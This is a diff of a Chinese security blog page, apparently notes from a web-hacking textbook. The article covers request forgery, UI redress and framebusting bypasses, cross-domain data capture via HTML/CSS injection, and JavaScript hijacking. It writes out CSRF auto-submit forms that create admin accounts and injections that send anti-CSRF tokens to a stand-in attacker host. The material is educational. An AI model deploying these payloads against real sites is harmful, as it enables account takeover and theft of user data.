@@ -29,7 +29,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 <body>
@@ -395,14 +395,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        12.9k
+                        10.7k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        47 分
+                        39 分
                     </div>
                     
                 
@@ -422,16 +422,30 @@
 <h3 id="请求伪造"><a href="#请求伪造" class="headerlink" title="请求伪造"></a>请求伪造</h3><p>这种类型的攻击也称为会话叠置(session riding)，它们与会话劫持攻击密切相关。在会话劫持攻击的过程中，攻击者截获一名用户的会话令牌，因而可以“作为”该用户适用应用程序。但是，通过伪造攻击，攻击者根本不需要知道受害者的会话令牌。相反，攻击者利用Web浏览器的正常行为劫持用户的令牌，并通过它提出用户并不不打算提出的请求</p>
 <p>请求伪造漏洞分为两种类型：本站点和跨站点</p>
 <h4 id="本站点请求伪造"><a href="#本站点请求伪造" class="headerlink" title="本站点请求伪造"></a>本站点请求伪造</h4><p>本站点请求伪造(On-Site Request Forgery,OSRF)是一种保存型XSS漏洞的常见攻击有效载荷。以消息公告牌应用程序为例，它允许用户提交可被其他用户查看的数据。该应用程序使用以下请求提交信息：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /submit.php</span><br><span class="line">Host: wahh-app.com</span><br><span class="line">Content-Length: 34</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span>=question&amp;name=daf&amp;message=foo</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">POST /submit.php
+Host: wahh-app.com
+Content-Length: 34
+
+type<span class="token operator">=</span>question<span class="token operator">&amp;</span>name<span class="token operator">=</span>daf<span class="token operator">&amp;</span>message<span class="token operator">=</span>foo</code></pre>
 <p>这个请求将以下内容添加到消息页面中</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;&lt;img src=<span class="string">"/images/question.gif"</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td&gt;daf&lt;/td&gt;</span><br><span class="line">&lt;td&gt;foo&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>tr<span class="token operator">></span>
+<span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/images/question.gif"</span><span class="token operator">></span><span class="token operator">&lt;</span>/td<span class="token operator">></span>
+<span class="token operator">&lt;</span>td<span class="token operator">></span>daf<span class="token operator">&lt;</span>/td<span class="token operator">></span>
+<span class="token operator">&lt;</span>td<span class="token operator">></span>foo<span class="token operator">&lt;</span>/td<span class="token operator">></span>
+<span class="token operator">&lt;</span>/tr<span class="token operator">></span></code></pre>
 <p>在这种情况下，假设应用程序已经对插入页面的任何特殊字符进行了正确的HTML编码(并认为它不会受到XSS攻击)。上述示例中，我们控制的仅仅是&lt; img&gt;标签目标的一部分内容，虽然我们无法破坏引用字符串，但是可以修改URL，使得查看消息的用户提出一个尝试提出任意一个本站点的GET请求。例如，在type参数中提交下面的值将会使任何查看消息的用户提出一个尝试创建新的管理用户的请求：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../admin/newUser.php?username=daf2&amp;password=0wned&amp;role=admin<span class="comment"># //#终止了.gif后缀前面的URL</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">..</span>/admin/newUser.php?username<span class="token operator">=</span>daf2<span class="token operator">&amp;</span>password<span class="token operator">=</span>0wned<span class="token operator">&amp;</span>role<span class="token operator">=</span>admin<span class="token comment" spellcheck="true"># //#终止了.gif后缀前面的URL</span></code></pre>
 <p>如果一名普通用户被诱使提出攻击者专门设计的请求，攻击不会成功。但是如果管理员查看信息，攻击者就可以创建一个秘密账户。在此例中，虽然无法对其进行XSS攻击，但攻击者仍然能够成功执行OSRF攻击。</p>
 <p>在将其合并到响应之前，尽可能严格地确认用户提交的输入，即可防止OSRF漏洞。例如，上面的示例中，应用程序对type参数是否有一组值或某一个特殊的值进行检查。如果应用程序必须接受无法预料的其他值，那么应阻止任何包含/ . ?&amp;与=的请求。<br>对这些字符进行HTML编码并不能有效防止OSRF攻击攻击，因为浏览器在请求目标的URL字符串之前，会首先对其进行解码。</p>
 <h4 id="跨站点请求伪造"><a href="#跨站点请求伪造" class="headerlink" title="跨站点请求伪造"></a>跨站点请求伪造</h4><p>跨站点请求伪造(CSRF)中，攻击者只需创建一个看似无害的网站，致使用户的浏览器直接向易受攻击的应用程序提出一个请求，执行某种有利于攻击者的“无意”操作。<br>同源策略并不阻止一个网站向另一个域提出请求。但是，它确实阻止提出请求的网站处理跨域请求的响应。因此，正常情况下，CSRF攻击只是一种“单向”攻击。</p>
 <p>以某个允许管理员使用以下请求创建新用户账户的应用程序为例：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /auth/newUser.ashx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Cookie: sessionId=xxxxxxxxxxxxxxxxxxxxxxxxxxxxx(此处省略)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">realname=daf&amp;username=daf&amp;userrole=admin&amp;password=letmein1&amp;confirmpassword=letmein1</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">POST /auth/newUser.ashx HTTP/1.1
+Host: mdsec.net
+Cookie: sessionId<span class="token operator">=</span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="token punctuation">(</span>此处省略<span class="token punctuation">)</span>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+
+realname<span class="token operator">=</span>daf<span class="token operator">&amp;</span>username<span class="token operator">=</span>daf<span class="token operator">&amp;</span>userrole<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>letmein1<span class="token operator">&amp;</span>confirmpassword<span class="token operator">=</span>letmein1</code></pre>
 <p>此请求有3个主要特定使得它易于受到CSRF攻击：</p>
 <ol>
 <li>该请求执行特权操作(管理员请求创建用户)</li>
@@ -439,7 +453,19 @@
 <li>攻击者可以确定执行操作所需的所有参数。(除cookie中的会话令牌外，请求中不包含任何无法预测的值)</li>
 </ol>
 <p>针对这些缺陷，攻击者可以构建一个Web页面，向易受攻击的应用程序提出一个跨域请求，在其中包含执行特权操作所需的所有步骤。以下为这种攻击的一种示例：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"http://mdsec.net/auth/newUser.ashx"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"realname"</span> value=<span class="string">"daf"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"username"</span> value=<span class="string">"daf"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"userrole"</span> value=<span class="string">"admin"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"password"</span> value=<span class="string">"letmein1"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"confirmpassword"</span> value=<span class="string">"letmein1"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.forms[0].submit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&gt;</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>html<span class="token operator">></span>
+<span class="token operator">&lt;</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://mdsec.net/auth/newUser.ashx"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"realname"</span> value<span class="token operator">=</span><span class="token string">"daf"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"username"</span> value<span class="token operator">=</span><span class="token string">"daf"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"userrole"</span> value<span class="token operator">=</span><span class="token string">"admin"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"password"</span> value<span class="token operator">=</span><span class="token string">"letmein1"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"confirmpassword"</span> value<span class="token operator">=</span><span class="token string">"letmein1"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>
+document.forms<span class="token punctuation">[</span>0<span class="token punctuation">]</span>.submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/html<span class="token operator">>></span></code></pre>
 <p>该攻击将所有请求参数放入隐藏表单字段，并包含一段自动提交表单的脚本。用户的浏览器提交该表单时，将自动添加用户的目标域的cookie，并且应用程序会正常处理生成的请求。如果管理用户登录到易受攻击的应用程序中，并访问攻击者的包含此表单的Web页面，该请求将在管理员的会话中处理，攻击者的账户因此得以创建。</p>
 <h5 id="利用CSRF漏洞"><a href="#利用CSRF漏洞" class="headerlink" title="利用CSRF漏洞"></a>利用CSRF漏洞</h5><p>CSRF漏洞主要出现在应用程序仅依赖HTTP cookie追踪会话令牌的情况下，一旦已经在用户的浏览器中设定了cookie，浏览器会自动在随后的每个请求中将这个cookie提交给应用程序。无论请求是来自某个链接、应用程序本身中的表单或任何其地方(如外部网站或在电子邮件中单击的链接)，它都会这样做。如果应用程序未采取防范措施来阻止攻击者以这种方式“叠置”它的用户的会话，它就易于受到CSRF攻击。</p>
 <h5 id="验证与CSRF"><a href="#验证与CSRF" class="headerlink" title="验证与CSRF"></a>验证与CSRF</h5><p>由于实施CSRF攻击需要在受害用户的会话中执行某种特权操作，因此，在实施攻击时，用户需要登录到应用程序中。</p>
@@ -460,10 +486,14 @@
 <p>要实施欺骗，即让受害用户虽然看到一个界面，但实际上却与另一个界面交互，攻击者可以采用各种CSS技术。加载目标程序的iframe可以为任意大小，位于攻击者页面中的任何位置，并显示目标页面的任意位置。使用适当的样式属性。可以令iframe完全透明，从而使其对用户不可见。</p>
 <h4 id="“破坏框架”防御"><a href="#“破坏框架”防御" class="headerlink" title="“破坏框架”防御"></a>“破坏框架”防御</h4><p>许多Web应用程序寻求采用一种称为破坏框架(framebusting)的技术来防范这类攻击。<br>破坏框架可以表现为各种形式，但基本上，它是指每个相关的应用程序页面都会运行一段脚本来检测自己是否被加载到iframe中。如果是，应用程序会尝试”破坏”该iframe，或执行其他防御性操作，如重定向到错误页面或拒绝显示应用程序自己的界面。</p>
 <p>这些防御可以通过某种方式突破。下面我们通过一段“破坏框架”的代码来加以说明：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">if</span> (top.location != self.location)&#123;</span><br><span class="line">	top.location = self.location;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>top.location <span class="token operator">!=</span> self.location<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    top.location <span class="token operator">=</span> self.location<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
 <p>这段代码检查页面本身的URL与浏览器窗口中的顶部框架的URL是否匹配。如果不匹配，则说明页面已经被加载到子框架内。在这种情况下，脚本会尝试将页面重新加载到窗口内的顶层框架中，从而“逃离”该框架。<br>实施UI伪装攻击的攻击者可以通过各种方法避开这种防御：</p>
 <ul>
-<li>由于攻击者的页面控制着顶层框架，因而可以重新定义<font color="#fb8c00">top.location</font>的含义，在子框架尝试引用它而导致的异常。例如，攻击者可以在IE浏览器中运行以下代码：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var location=<span class="string">'foo'</span>;</span><br></pre></td></tr></table></figure>
+<li>由于攻击者的页面控制着顶层框架，因而可以重新定义<font color="#fb8c00">top.location</font>的含义，在子框架尝试引用它而导致的异常。例如，攻击者可以在IE浏览器中运行以下代码：<pre class=" language-bash"><code class="language-bash">var location<span class="token operator">=</span><span class="token string">'foo'</span><span class="token punctuation">;</span></code></pre>
 这段代码将location重新定义为顶层框架中的本地变量，在子框架运行的代码无法访问该变量。</li>
 <li>顶层框架可能会钩住<font color="#fb8c00">window.onbeforeunload</font>事件，从而在“破坏框架”代码尝试设置顶层框架的位置时运行攻击者的事件处理程序。这时，攻击者的代码可以对返回的HTTP 204(无内容)响应的URL执行进一步的重定向。这会导致浏览器取消重定向调用链，使顶层框架的URL保持不变。</li>
 <li>顶层框架可以在目标应用程序加载到子框架中时定义<font color="#fb8c00">sandbox</font>属性，这会在子框架中禁用脚本，同时将cookie保持为启用状态。</li>
@@ -473,40 +503,74 @@
 <h2 id="跨域捕获数据"><a href="#跨域捕获数据" class="headerlink" title="跨域捕获数据"></a>跨域捕获数据</h2><p>同源策略旨在防止在同一个域中运行的代码访问由其他域提供的内容。因此，跨站点请求伪造攻击通常被称为“单向”攻击。虽然一个域可以向另一个域提出请求，但它很难读取这些域的响应，从而从其他域中窃取用户数据。<br>有各种攻击技巧可用于从其他域中捕获整个或部分响应。</p>
 <h3 id="通过注入HTML捕获数据"><a href="#通过注入HTML捕获数据" class="headerlink" title="通过注入HTML捕获数据"></a>通过注入HTML捕获数据</h3><p>与利用XSS漏洞不同，攻击者可以利用许多应用程序提供的功能，在其他用户收到的响应中注入一段有效的HTML。例如，Web邮件可能会显示包含某个HTML标记的电子邮件。但会阻止可用于执行脚本代码的任何标签和属性。或者，动态生成的错误消息可能会过滤一系列表达式，但仍然允许有限使用HTML。<br>在这些情况下，就可以利用HTML注入条件向攻击者所在的域发送页面中的敏感数据。</p>
 <p>以一个允许攻击者在以下响应中注入有限的HTML的Web邮件应用程序为例：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[limited HTML injection here]</span><br><span class="line">&lt;form action=<span class="string">"http://wahh-mail.com/forwardmail"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"nonce"</span> value=<span class="string">"123"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Forward"</span>&gt;</span><br><span class="line">....</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var statsTrackerId=<span class="string">'AAE78F27CB3210D'</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>limited HTML injection here<span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://wahh-mail.com/forwardmail"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"nonce"</span> value<span class="token operator">=</span><span class="token string">"123"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Forward"</span><span class="token operator">></span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span>
+<span class="token operator">&lt;</span>/form<span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>
+var statsTrackerId<span class="token operator">=</span><span class="token string">'AAE78F27CB3210D'</span><span class="token punctuation">;</span>
+<span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
 <p>在注入点之后，页面包含了一个提供CSRF令牌的HTML表单。在这种情况下，可以在上述响应中注入以下文本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">'http://mdattacker.net/capture?html=</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>'http://mdattacker.net/capture?html<span class="token operator">=</span></code></pre>
 <p>这段HTML将打开一个指向攻击者域中的URL的图像标签。该URL包含在单引号内，但URL字符串并未终止，&lt; img&gt;标签也没有结束。这会导致浏览器将注入点之后的文本视为URL的一部分，直到遇到单引号，也就是响应中随后出现引用的JavaScript字符串的位置。浏览器接受各种插入字符，也允许URL跨越多行。<br>用户浏览器在处理攻击者注入的响应时，它会尝试提取指定的图像，并向以下URL提出请求，从而向攻击者的域中发送敏感的反CSRF令牌：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://mdattacker.net/capture?html=&lt;form%20action=<span class="string">"http://wahh-mail.com/forwardmail"</span>%20method=<span class="string">"POST"</span>&gt;&lt;input%20type=<span class="string">"hidden"</span>%20name=<span class="string">"nonce"</span>%20value=<span class="string">"123"</span>&gt;&lt;input%20type=<span class="string">"submit"</span>%20value=<span class="string">"Forward"</span>&gt;</span><br><span class="line">....</span><br><span class="line">&lt;/form&gt;&lt;script&gt;var statsTrackerId=</span><br></pre></td></tr></table></figure>
-
-
+<pre class=" language-bash"><code class="language-bash">http://mdattacker.net/capture?html<span class="token operator">=</span><span class="token operator">&lt;</span>form%20action<span class="token operator">=</span><span class="token string">"http://wahh-mail.com/forwardmail"</span>%20method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span><span class="token operator">&lt;</span>input%20type<span class="token operator">=</span><span class="token string">"hidden"</span>%20name<span class="token operator">=</span><span class="token string">"nonce"</span>%20value<span class="token operator">=</span><span class="token string">"123"</span><span class="token operator">></span><span class="token operator">&lt;</span>input%20type<span class="token operator">=</span><span class="token string">"submit"</span>%20value<span class="token operator">=</span><span class="token string">"Forward"</span><span class="token operator">></span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span>
+<span class="token operator">&lt;</span>/form<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>var statsTrackerId<span class="token operator">=</span></code></pre>
 <p>另一个攻击可以注入以下文本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://mdattacker.net/capture"</span> method=<span class="string">"POST"</span>&gt;</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://mdattacker.net/capture"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span></code></pre>
 <p>此攻击在应用程序本身使用的&lt; form&gt;标签之前注入一个指定攻击者域的&lt; form&gt;标签。在这种情况下，浏览器在遇到嵌入的&lt; form&gt;标签时，它们将忽略该标签，在遇到第一个&lt; form&gt;标签的情况下处理表单。因此，如果用户提交表单，表单中的所有参数，包括敏感的反CSRF令牌，也会被提交到攻击者的服务器中：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /capture HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 192</span><br><span class="line">Host: mdsec.net</span><br><span class="line"></span><br><span class="line">nonce=123&amp;....</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">POST /capture HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+Host: mdsec.net
+
+nonce<span class="token operator">=</span>123<span class="token operator">&amp;</span><span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre>
 <p>由于第二个攻击仅注入了格式正常的HTML，因此能够有效避开那些旨在允许回显的输入中的HTML子集的过滤</p>
 <h3 id="通过注入CSS捕获数据"><a href="#通过注入CSS捕获数据" class="headerlink" title="通过注入CSS捕获数据"></a>通过注入CSS捕获数据</h3><p>许多时候，应用程序会阻止或对注入的输入中的&lt;、&gt;字符进行编码，防止攻击者插入任何新的HTML标签。Web应用程序中大多存在此类纯文本注入条件。例如，在一个Web邮件应用程序中，攻击者可以通过电子邮件主题行在目标用户的响应中注入有限的文本。在这种情况下，攻击者可以通过在应用程序中注入CSS来捕获敏感数据。</p>
 <p>在上述HTML的示例中，假设攻击者发送以下主题行的电子邮件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;*&#123;font-family:<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token punctuation">}</span>*<span class="token punctuation">{</span>font-family:'</code></pre>
 <p>其中不包含任何HTML元字符，大多数用户都接受并在收件人用户的响应中显示这段代码。这时，返回给用户的响应可能与以下内容相似：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;td&gt;&#123;&#125;*&#123;font-family:<span class="string">'&lt;/td&gt;</span></span><br><span class="line"><span class="string">&lt;form action="http://wahh-mail.com/forwardmail" method="POST"&gt;</span></span><br><span class="line"><span class="string">&lt;input type="hidden" name="nonce" value="123"&gt;</span></span><br><span class="line"><span class="string">&lt;input type="submit" value="Forward"&gt;</span></span><br><span class="line"><span class="string">....</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">var statsTrackerId='</span>AAE78F27CB3210D<span class="string">';</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token punctuation">{</span><span class="token punctuation">}</span>*<span class="token punctuation">{</span>font-family:<span class="token string">'&lt;/td>
+&lt;form action="http://wahh-mail.com/forwardmail" method="POST">
+&lt;input type="hidden" name="nonce" value="123">
+&lt;input type="submit" value="Forward">
+....
+&lt;/form>
+&lt;script>
+var statsTrackerId='</span>AAE78F27CB3210D'<span class="token punctuation">;</span>
+<span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
 <p>很明显，此响应中包含HTML。但奇怪的是，浏览器将该响应加载为CSS样式表，能正常处理其中包含的任何CSS定义。在这段代码中，注入的响应定义了CSS font-family属性，并将一个引用的字符串作为属性定义，攻击者注入的文本并未终止该字符串，因此，该字符串会一直持续到响应的剩余部分，包括包含敏感的反CSRF令牌的隐藏字段。</p>
 <p>要利用这种行为，攻击者需要在自己的域中创建一个页面，在其中包含CSS样式表形式的注入响应。这会在攻击者自己的页面中应用任何嵌入的CSS定义。然后，攻击者可以使用JavaScript来查询这些定义，从而检索捕获到的数据</p>
 <h3 id="JavaScript劫持"><a href="#JavaScript劫持" class="headerlink" title="JavaScript劫持"></a>JavaScript劫持</h3><p>JavaScript劫持提供了另一种跨域数据捕获的方法，从而将CSRF转化为一种有限的“双向”攻击。同源策略允许一个域包含其他域的脚本代码，并可以在调用域(而不是发布域)中运行。今天的许多应用程序都用JavaScript来传输敏感数据。接下来我们将介绍各种使用动态执行的脚本代码来传输敏感数据的方法，以及如何劫持这类代码，以捕获域中的数据。</p>
 <h4 id="函数回调"><a href="#函数回调" class="headerlink" title="函数回调"></a>函数回调</h4><p>以一个应用程序为例，它在当前用户单击相应的选项卡时，在用户界面中显示该用户的个人信息。为提供无缝的用户体验，应用程序使用异步请求提取用户信息。当用户单击“个人资源”选项卡时，某段客户端代码将动态包含以下脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mdsec.net/YourDetailsJson.ashx</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">https://mdsec.net/YourDetailsJson.ashx</code></pre>
 <p>针对此URL的响应包含一个函数回调，该函数在UI中显示用户资料。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">showUserInfo(</span><br><span class="line">	[</span><br><span class="line">       [<span class="string">'Name'</span>,<span class="string">'Alice'</span>],</span><br><span class="line">       [<span class="string">'Username'</span>,<span class="string">'tree'</span>],</span><br><span class="line">       [<span class="string">'Password'</span>,<span class="string">'123'</span>],</span><br><span class="line">       [<span class="string">'Uid'</span>,<span class="string">'11'</span>],</span><br><span class="line">       [<span class="string">'Role'</span>,<span class="string">'User'</span>]</span><br><span class="line">	]);</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">showUserInfo<span class="token punctuation">(</span>
+    <span class="token punctuation">[</span>
+       <span class="token punctuation">[</span><span class="token string">'Name'</span>,<span class="token string">'Alice'</span><span class="token punctuation">]</span>,
+       <span class="token punctuation">[</span><span class="token string">'Username'</span>,<span class="token string">'tree'</span><span class="token punctuation">]</span>,
+       <span class="token punctuation">[</span><span class="token string">'Password'</span>,<span class="token string">'123'</span><span class="token punctuation">]</span>,
+       <span class="token punctuation">[</span><span class="token string">'Uid'</span>,<span class="token string">'11'</span><span class="token punctuation">]</span>,
+       <span class="token punctuation">[</span><span class="token string">'Role'</span>,<span class="token string">'User'</span><span class="token punctuation">]</span>
+    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 <p>在这种情况下，攻击者可以创建一个showUserInfo函数的页面，并在其中包含传送个人信息的脚本。从而捕获用户资源，一个简单的概念验证攻击如下所示：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> showUserInfo(x)&#123;alert(x);&#125;  //用户个人资料</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"https://mdsec.net/YourDetailsJson.ashx"</span>&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>
+<span class="token keyword">function</span> showUserInfo<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>alert<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>  //用户个人资料
+<span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://mdsec.net/YourDetailsJson.ashx"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>
